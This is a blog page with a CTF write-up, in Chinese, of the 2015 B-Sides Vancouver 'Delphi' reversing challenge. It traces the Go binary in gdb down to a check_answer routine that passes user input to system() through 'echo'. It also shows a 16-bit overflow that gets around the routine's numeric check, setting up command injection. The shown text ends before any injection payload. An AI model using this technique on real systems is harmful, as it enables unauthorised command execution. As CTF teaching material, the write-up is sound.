@@ -1,0 +1,876 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-0.17.3, mkdocs-material-2.7.2">
+    
+    
+      
+        <title>Delphi - frozenkp's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.8d40d89b.css">
+      
+    
+    
+      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+      
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    
+    
+    
+  </head>
+  
+    <body dir="ltr">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
+    
+      <a href="#delphi" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../../../.." title="frozenkp's Blog" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                frozenkp's Blog
+              </span>
+              <span class="md-header-nav__topic">
+                Delphi
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/frozenkp/frozenkp.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      frozenkp/frozenkp
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="drawer">
+    <span class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </span>
+    frozenkp's Blog
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/frozenkp/frozenkp.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      frozenkp/frozenkp
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../../.." title="HOME" class="md-nav__link">
+      HOME
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Writeups
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Writeups
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1">
+    
+    <label class="md-nav__link" for="nav-2-1">
+      2014
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        2014
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-1" type="checkbox" id="nav-2-1-1">
+    
+    <label class="md-nav__link" for="nav-2-1-1">
+      NoConName qual
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-1">
+        NoConName qual
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../2014/NoConName_qual/inBINcible/" title="inBINcible" class="md-nav__link">
+      inBINcible
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2" checked>
+    
+    <label class="md-nav__link" for="nav-2-2">
+      2015
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        2015
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-1" type="checkbox" id="nav-2-2-1" checked>
+    
+    <label class="md-nav__link" for="nav-2-2-1">
+      B-Sides Vancouver
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-2-1">
+        B-Sides Vancouver
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="toc">
+        Delphi
+      </label>
+    
+    <a href="./" title="Delphi" class="md-nav__link md-nav__link--active">
+      Delphi
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#observation" title="Observation" class="md-nav__link">
+    Observation
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file" title="file" class="md-nav__link">
+    file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#go-binary" title="go binary" class="md-nav__link">
+    go binary
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#input" title="Input" class="md-nav__link">
+    Input
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dothemagic" title="doTheMagic" class="md-nav__link">
+    doTheMagic
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check_answer" title="check_answer" class="md-nav__link">
+    check_answer
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-injection" title="command injection" class="md-nav__link">
+    command injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#observation" title="Observation" class="md-nav__link">
+    Observation
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file" title="file" class="md-nav__link">
+    file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#go-binary" title="go binary" class="md-nav__link">
+    go binary
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#input" title="Input" class="md-nav__link">
+    Input
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dothemagic" title="doTheMagic" class="md-nav__link">
+    doTheMagic
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check_answer" title="check_answer" class="md-nav__link">
+    check_answer
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-injection" title="command injection" class="md-nav__link">
+    command injection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/frozenkp/frozenkp.github.io/edit/master/docs/Writeups/2015/B-Sides_Vancouver/Delphi.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="delphi">Delphi</h1>
+<blockquote>
+<p>Challenge link: Nope</p>
+<p>Category: reverse</p>
+<p>Writeup: <a href="https://github.com/frozenkp/CTF/tree/master/2015/B-Sides_Vancouver/Delphi">Delphi</a></p>
+</blockquote>
+<p><a href="https://github.com/ctfs/write-ups-2015/blob/master/bsides-vancouver-ctf-2015/ownable/delphi/delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b">delphi</a></p>
+<p><a href="https://github.com/ctfs/write-ups-2015/blob/master/bsides-vancouver-ctf-2015/ownable/delphi/libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2">libtwenty.so</a></p>
+<h2 id="observation">Observation</h2>
+<p>因為有額外給的 Library ，所以要執行(分析)的時候要搭配 <code>LD_LIBRARY_PATH=.</code> 將當前資料夾指定給 Library 路徑</p>
+<div class="highlight"><pre><span></span>$ <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>. ./delphi 
+Welcome!
+
+Are you ready to play <span class="m">20</span> questions? No? Perfect!
+I<span class="s1">&#39;m thinking of something big, metal, and orange. Go!</span>
+<span class="s1">&gt; test</span>
+<span class="s1">Who&#39;</span>s that?
+&gt; deadbeef
+Who<span class="err">&#39;</span>s that?
+&gt;
+</pre></div>
+
+<h3 id="file">file</h3>
+<div class="highlight"><pre><span></span>$ file ./delphi 
+./delphi: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>70886b932f383987896e371d422ab8a4089bd148, not stripped
+</pre></div>
+
+<h3 id="go-binary">go binary</h3>
+<p>Objdump 後發現 <code>main.main</code> ，是 go 的 binary 檔，其中在 main package 中有兩個比較特別的 function</p>
+<ul>
+<li>main.doTheMagic</li>
+<li>main._Cfunc_check_answer (cgo 的 function)</li>
+</ul>
+<div class="highlight"><pre><span></span>$ objdump -d delphi <span class="p">|</span> grep <span class="s1">&#39;.*main.*&gt;:&#39;</span>
+0000000000400df0 &lt;__libc_start_main@plt&gt;:
+<span class="m">0000000000401280</span> &lt;main.main&gt;:
+0000000000401c30 &lt;main.doTheMagic&gt;:
+0000000000401df0 &lt;main.init&gt;:
+00000000004021c0 &lt;main._Cfunc_CString&gt;:
+<span class="m">0000000000402230</span> &lt;main._Cfunc_check_answer&gt;:
+<span class="m">0000000000402270</span> &lt;main._Cfunc_free&gt;:
+0000000000411b20 &lt;runtime.main&gt;:
+00000000004295b0 &lt;main&gt;:
+</pre></div>
+
+<h2 id="solution">Solution</h2>
+<h3 id="input">Input</h3>
+<p>一開始先找看看輸入的地方</p>
+<div class="highlight"><pre><span></span>$ go tool objdump delphi <span class="p">|</span> grep <span class="s1">&#39;.*main\.go.*Scan&#39;</span>
+        main.go:34      0x4016ee        bd30b74f00                      MOVL <span class="nv">$bufio</span>.ScanLines.f<span class="o">(</span>SB<span class="o">)</span>, BP
+        main.go:35      0x401755        e816b80200                      CALL bufio.<span class="o">(</span>*Scanner<span class="o">)</span>.Scan<span class="o">(</span>SB<span class="o">)</span>
+</pre></div>
+
+<div class="highlight"><pre><span></span>   0x401747 &lt;main.main+1223&gt;:   mov    QWORD PTR <span class="o">[</span>rsp+0x48<span class="o">]</span>,rax
+   0x40174c &lt;main.main+1228&gt;:   mov    rbx,QWORD PTR <span class="o">[</span>rsp+0x48<span class="o">]</span>
+   0x401751 &lt;main.main+1233&gt;:   mov    QWORD PTR <span class="o">[</span>rsp<span class="o">]</span>,rbx
+<span class="o">=</span>&gt; 0x401755 &lt;main.main+1237&gt;:   call   0x42cf70 &lt;bufio.<span class="o">(</span>*Scanner<span class="o">)</span>.Scan&gt;
+   0x40175a &lt;main.main+1242&gt;:   movzx  rbx,BYTE PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>
+   0x401760 &lt;main.main+1248&gt;:   cmp    bl,0x0
+   0x401763 &lt;main.main+1251&gt;:   je     0x4018b1 &lt;main.main+1585&gt;
+   0x401769 &lt;main.main+1257&gt;:   mov    rdi,QWORD PTR <span class="o">[</span>rsp+0x48<span class="o">]</span>
+Guessed arguments:
+arg<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0xc208028130 --&gt; 0x0 
+arg<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x7ffff7e20df0 --&gt; 0xc208020000 --&gt; 0x0 
+</pre></div>
+
+<p>輸入 deadbeef 後繼續觀察</p>
+<p>發現後面出現一段有趣的比較，此時的 <code>rdx</code> 是輸入的長度，<code>rax</code> 是 'go' 的長度</p>
+<p>由底下 <code>jl</code> 和 <code>jb</code> 可知 <strong>輸入不能小於 2 </strong></p>
+<div class="highlight"><pre><span></span>RAX: 0x2 
+RBX: 0x4d7f60 --&gt; 0x4d7f70 --&gt; 0x6f67 <span class="o">(</span><span class="s1">&#39;go&#39;</span><span class="o">)</span>
+RCX: 0x66656562 <span class="o">(</span><span class="s1">&#39;beef&#39;</span><span class="o">)</span>
+RDX: 0x8 
+RSI: 0x4d7f70 --&gt; 0x6f67 <span class="o">(</span><span class="s1">&#39;go&#39;</span><span class="o">)</span>
+RDI: 0xc208000260 <span class="o">(</span><span class="s2">&quot;deadbeef&quot;</span><span class="o">)</span>
+RBP: 0x7ffff7fb3000 --&gt; 0x781d28 <span class="o">(</span>0x00007ffff7fb3000<span class="o">)</span>
+RSP: 0x7ffff7e20dc0 --&gt; 0xc208013000 <span class="o">(</span><span class="s2">&quot;deadbeef\n&quot;</span><span class="o">)</span>
+<span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+   0x401939 &lt;main.main+1721&gt;:   mov    rax,QWORD PTR <span class="o">[</span>rbx+0x8<span class="o">]</span>
+   0x40193d &lt;main.main+1725&gt;:   mov    QWORD PTR <span class="o">[</span>rsp+0x90<span class="o">]</span>,rdx
+   0x401945 &lt;main.main+1733&gt;:   mov    QWORD PTR <span class="o">[</span>rsp+0xb0<span class="o">]</span>,rax
+<span class="o">=</span>&gt; 0x40194d &lt;main.main+1741&gt;:   cmp    rdx,rax
+   0x401950 &lt;main.main+1744&gt;:   jl     0x401baa &lt;main.main+2346&gt;
+   0x401956 &lt;main.main+1750&gt;:   cmp    rdx,rax
+   0x401959 &lt;main.main+1753&gt;:   jb     0x401bb2 &lt;main.main+2354&gt;
+   0x40195f &lt;main.main+1759&gt;:   mov    QWORD PTR <span class="o">[</span>rsp+0xb8<span class="o">]</span>,rdi
+</pre></div>
+
+<p>再往下看，出現了 <code>runtime.eqstring</code> </p>
+<p>比較的目標是 輸入 ( 'deadbeef' ) 以及 'go' 的前兩個 byte (0x2)</p>
+<div class="highlight"><pre><span></span>   0x401986 &lt;main.main+1798&gt;:   mov    QWORD PTR <span class="o">[</span>rsp+0x18<span class="o">]</span>,rax
+<span class="o">=</span>&gt; 0x40198b &lt;main.main+1803&gt;:   call   0x425600 &lt;runtime.eqstring&gt;
+   0x401990 &lt;main.main+1808&gt;:   movzx  rbx,BYTE PTR <span class="o">[</span>rsp+0x20<span class="o">]</span>
+<span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+<span class="m">0000</span><span class="p">|</span> 0x7ffff7e20dc0 --&gt; 0xc208000260 <span class="o">(</span><span class="s2">&quot;deadbeef&quot;</span><span class="o">)</span>
+<span class="m">0008</span><span class="p">|</span> 0x7ffff7e20dc8 --&gt; 0x2 
+<span class="m">0016</span><span class="p">|</span> 0x7ffff7e20dd0 --&gt; 0x4d7f70 --&gt; 0x6f67 <span class="o">(</span><span class="s1">&#39;go&#39;</span><span class="o">)</span>
+<span class="m">0024</span><span class="p">|</span> 0x7ffff7e20dd8 --&gt; 0x2
+</pre></div>
+
+<p>實際測試一下，果然輸入開頭是 go 的話就會出現不一樣的結果</p>
+<div class="highlight"><pre><span></span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>. ./delphi 
+Welcome!
+
+Are you ready to play <span class="m">20</span> questions? No? Perfect!
+I<span class="s1">&#39;m thinking of something big, metal, and orange. Go!</span>
+<span class="s1">&gt; goabcd</span>
+<span class="s1">Sneaky, sneaky. Go where? How fast?</span>
+<span class="s1">&gt; go</span>
+<span class="s1">Sneaky, sneaky. Go where? How fast?</span>
+<span class="s1">&gt; abcd</span>
+<span class="s1">Who&#39;</span>s that?
+&gt; 
+</pre></div>
+
+<p>比對正確後就會進入 <code>main.doTheMagic</code> 了</p>
+<div class="highlight"><pre><span></span>   0x401a0d &lt;main.main+1933&gt;:   mov    QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>,rax
+<span class="o">=</span>&gt; 0x401a12 &lt;main.main+1938&gt;:   call   0x401c30 &lt;main.doTheMagic&gt;
+   0x401a17 &lt;main.main+1943&gt;:   lea    rbx,ds:0x4d4060
+</pre></div>
+
+<h3 id="dothemagic">doTheMagic</h3>
+<p>繼續往下看，發現 <code>strings.Split</code> ，以空格( ' ' )作為切割點</p>
+<p>繼續執行後就結束了</p>
+<div class="highlight"><pre><span></span>   0x401c77 &lt;main.doTheMagic+71&gt;:       mov    rdi,rbp
+   0x401c7a &lt;main.doTheMagic+74&gt;:       movs   QWORD PTR es:<span class="o">[</span>rdi<span class="o">]</span>,QWORD PTR ds:<span class="o">[</span>rsi<span class="o">]</span>
+   0x401c7c &lt;main.doTheMagic+76&gt;:       movs   QWORD PTR es:<span class="o">[</span>rdi<span class="o">]</span>,QWORD PTR ds:<span class="o">[</span>rsi<span class="o">]</span>
+<span class="o">=</span>&gt; 0x401c7e &lt;main.doTheMagic+78&gt;:       call   0x44a480 &lt;strings.Split&gt;
+   0x401c83 &lt;main.doTheMagic+83&gt;:       mov    rdx,QWORD PTR <span class="o">[</span>rsp+0x20<span class="o">]</span>
+   0x401c88 &lt;main.doTheMagic+88&gt;:       mov    rax,QWORD PTR <span class="o">[</span>rsp+0x28<span class="o">]</span>
+   0x401c8d &lt;main.doTheMagic+93&gt;:       mov    rcx,QWORD PTR <span class="o">[</span>rsp+0x30<span class="o">]</span>
+   0x401c92 &lt;main.doTheMagic+98&gt;:       mov    QWORD PTR <span class="o">[</span>rsp+0x68<span class="o">]</span>,rdx
+Guessed arguments:
+arg<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x7ffff7e20d40 --&gt; 0x8 
+arg<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x4d37d0 --&gt; 0x20 <span class="o">(</span><span class="s1">&#39; &#39;</span><span class="o">)</span>
+</pre></div>
+
+<p>另外在後面可以找到 <code>main._Cfunc_check_answer</code></p>
+<div class="highlight"><pre><span></span>401dbf:       e8 6c <span class="m">04</span> <span class="m">00</span> <span class="m">00</span>          callq  <span class="m">402230</span> &lt;main._Cfunc_check_answer&gt;
+</pre></div>
+
+<p>我猜可能輸入要用空格分成好幾段，因此我在 <code>main._Cfunc_check_answer</code> 設斷點，並填入不同數目的輸入測試，最後發現需要輸入共三段就會經過斷點，輸入格式如下</p>
+<div class="highlight"><pre><span></span>go &lt;something&gt; &lt;something&gt;
+</pre></div>
+
+<h3 id="check_answer">check_answer</h3>
+<p>往下看發現他利用 <code>cgocall</code> 呼叫了 <code>0x400f80</code></p>
+<div class="highlight"><pre><span></span><span class="o">=</span>&gt; 0x402249 &lt;main._Cfunc_check_answer+25&gt;:      mov    eax,0x400f80
+   0x40224e &lt;main._Cfunc_check_answer+30&gt;:      mov    QWORD PTR <span class="o">[</span>rsp<span class="o">]</span>,rax
+   0x402252 &lt;main._Cfunc_check_answer+34&gt;:      lea    rax,<span class="o">[</span>rsp+0x18<span class="o">]</span>
+   0x402257 &lt;main._Cfunc_check_answer+39&gt;:      mov    QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>,rax
+   0x40225c &lt;main._Cfunc_check_answer+44&gt;:      call   0x404da0 &lt;runtime.cgocall&gt;
+</pre></div>
+
+<div class="highlight"><pre><span></span>gdb-peda$ x/5gi 0x400f80
+   0x400f80 &lt;_cgo_de3376964270_Cfunc_check_answer&gt;:     mov    rsi,QWORD PTR <span class="o">[</span>rdi+0x8<span class="o">]</span>
+   0x400f84 &lt;_cgo_de3376964270_Cfunc_check_answer+4&gt;:   mov    edi,DWORD PTR <span class="o">[</span>rdi<span class="o">]</span>
+   0x400f86 &lt;_cgo_de3376964270_Cfunc_check_answer+6&gt;:   jmp    0x400de0 &lt;check_answer@plt&gt;
+   0x400f8b:    nop    DWORD PTR <span class="o">[</span>rax+rax*1+0x0<span class="o">]</span>
+   0x400f90 &lt;_cgo_de3376964270_Cfunc_free&gt;:     mov    rdi,QWORD PTR <span class="o">[</span>rdi<span class="o">]</span>
+</pre></div>
+
+<p>要追進去的話，建議是在 <code>0x400f80</code> 設斷點，接著 continue 過去，避免中途沒跟到</p>
+<p>最後會回到 check_answer</p>
+<div class="highlight"><pre><span></span><span class="o">=</span>&gt; 0x7ffff7bd5758 &lt;check_answer&gt;:       push   rbp
+   0x7ffff7bd5759 &lt;check_answer+1&gt;:     mov    rbp,rsp
+   0x7ffff7bd575c &lt;check_answer+4&gt;:     sub    rsp,0xa0
+   0x7ffff7bd5763 &lt;check_answer+11&gt;:    mov    DWORD PTR <span class="o">[</span>rbp-0x94<span class="o">]</span>,edi
+   0x7ffff7bd5769 &lt;check_answer+17&gt;:    mov    QWORD PTR <span class="o">[</span>rbp-0xa0<span class="o">]</span>,rsi
+</pre></div>
+
+<p>往下追會出現一個有趣的東西</p>
+<p>此時的 <code>eax</code> 是最後一段輸入的值，因為我輸入的是 <code>go abc def</code> ，所以這邊的 eax 因爲轉不出來所以變成 0</p>
+<p>add 後變成 42，由此可知 [rbp-0x2] 原始值應該是 42</p>
+<div class="highlight"><pre><span></span>   0x7ffff7bd5789 &lt;check_answer+49&gt;:    mov    eax,DWORD PTR <span class="o">[</span>rbp-0x94<span class="o">]</span>
+<span class="o">=</span>&gt; 0x7ffff7bd578f &lt;check_answer+55&gt;:    add    WORD PTR <span class="o">[</span>rbp-0x2<span class="o">]</span>,ax
+   0x7ffff7bd5793 &lt;check_answer+59&gt;:    movzx  eax,WORD PTR <span class="o">[</span>rbp-0x2<span class="o">]</span>
+   0x7ffff7bd5797 &lt;check_answer+63&gt;:    cmp    eax,0x4
+   0x7ffff7bd579a &lt;check_answer+66&gt;:    ja     0x7ffff7bd57ed &lt;check_answer+149&gt;
+</pre></div>
+
+<p>如果比較符合後跳過去，會出現 <code>strcat</code> 以及 <code>system</code> </p>
+<p>在 stack 中可以看到 ’echo' 以及第二段輸入 'abc' ，看來是合成 'echo abc' 以後利用 system 執行</p>
+<div class="highlight"><pre><span></span><span class="o">=</span>&gt; 0x7ffff7bd57d7 &lt;check_answer+127&gt;:   call   0x7ffff7bd5650 &lt;strcat@plt&gt;
+   0x7ffff7bd57dc &lt;check_answer+132&gt;:   lea    rax,<span class="o">[</span>rbp-0x90<span class="o">]</span>
+   0x7ffff7bd57e3 &lt;check_answer+139&gt;:   mov    rdi,rax
+   0x7ffff7bd57e6 &lt;check_answer+142&gt;:   call   0x7ffff7bd5630 &lt;system@plt&gt;
+<span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+<span class="m">0000</span><span class="p">|</span> 0x7fffffffe4f0 --&gt; 0x788170 --&gt; 0x636261 <span class="o">(</span><span class="s1">&#39;abc&#39;</span><span class="o">)</span>
+<span class="m">0008</span><span class="p">|</span> 0x7fffffffe4f8 --&gt; 0x0 
+<span class="m">0016</span><span class="p">|</span> 0x7fffffffe500 --&gt; 0x206f686365 <span class="o">(</span><span class="s1">&#39;echo &#39;</span><span class="o">)</span>
+</pre></div>
+
+<p>綜合上述，我們應該要使 42 + {number} &gt;= 4</p>
+<p>這裡有個有趣的地方，他在取值的時候是使用 WORD (2 bytes) 來取，當這裡的值超過 WORD 上限時就會歸零，我們可以利用這個點來達成上述的條件</p>
+<div class="highlight"><pre><span></span>number = 2^16 - 42 + eax
+</pre></div>
+
